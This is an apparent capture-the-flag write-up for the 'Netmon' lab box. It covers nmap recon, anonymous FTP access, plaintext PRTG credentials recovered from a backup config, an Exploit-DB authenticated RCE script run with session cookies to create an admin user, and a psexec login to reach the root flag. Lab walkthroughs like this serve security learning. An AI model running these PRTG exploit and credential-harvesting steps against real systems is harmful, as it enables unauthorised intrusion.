### IP
`10.10.10.152`

# Recon

### nmap
`nmap -sC -sV Netmon.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-22 02:53 EST
Nmap scan report for 10.10.10.152
Host is up (0.049s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m26s, deviation: 0s, median: 3m25s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-22T07:57:26
|_  start_date: 2020-11-22T07:55:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds

```
* Looks like nmap found an ftp server and automatically showed us the directories
* We also have a web server running Indy httpd
* We also have smb running

# Exploitation

### ftp
* This one was super easy. 
* We can log in to the server with `ftp 10.10.10.152`. 
	We can log in anonymously with the `anonymous` username and no password
* Once we cd to `/Users/Public`
* Now, we can download the file with `get user.txt`. 
* After that, we can just cat it on our own machine to get the user flag: `dd58ce67b49e15105e88096c8d9255a5`

### PRTG
* I did some digging and found [this](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) reddit post, which explains that old version of PRTG store credentials in plaintext at `C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak`

	* Downloading that file on the ftp server and runnning get on it will give us a file, which when examined a bit gives us this: 
```xml
   </dbcredentials>
            <dbpassword>
	      <!-- User: prtgadmin -->
	      PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
```
* Username: `prtgadmin`
* Password: `PrTg@dmin2018`

* Unfortunately, this password didn't work so I tried out a couple other years for the password
* `PrTg@dmin2019` worked
	* Strangely it didn't work for me at first and I was getting really frustrated, but when I came back the next day (and I assume the machine was reset), it worked. So maybe reset the machine if you run into the same issue

* Now we can log in!


### privesc
* Now that we have the login credentials, I remembered that searchsploit had a module for authenticated remote code execution
* For some reason the one on my computer wasn't working, so I ended up copying the code from [here](https://www.exploit-db.com/exploits/46527) to `exploit.sh`
* It turns out we have to have some cookie information for the exploit to work. I just went into the `network` section of inspect element to get it.
* Here's the complete command: `./exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1911846024.1606031704; _gid=GA1.4.667691852.1606031704; OCTOPUS1813713946=e0ExRkMzQzcxLUY3MzAtNDJBMS1BNEU2LTBDRjFDREExMEUzRn0;"`
* When that finishes executing, it gives the following output:
```

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
```
* A user in the administrators group with the username `pentest` and the password `P3nT3st!`
* After what must have been an hour of fiddling with tools, I finally figured out how to log in with the credentials
	* [this](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/) blog helped out a lot
* A script called `psexec` lets us log in with the command `python3 psexec.py pentest:'P3nT3st!'@10.10.10.152`
* Once in the machine, we can cd over to '\Users\Administrator\Desktop` and print the file with `more root.txt`
* The root flag is `3018977fb944bf1878f75b879fba67cc`
  
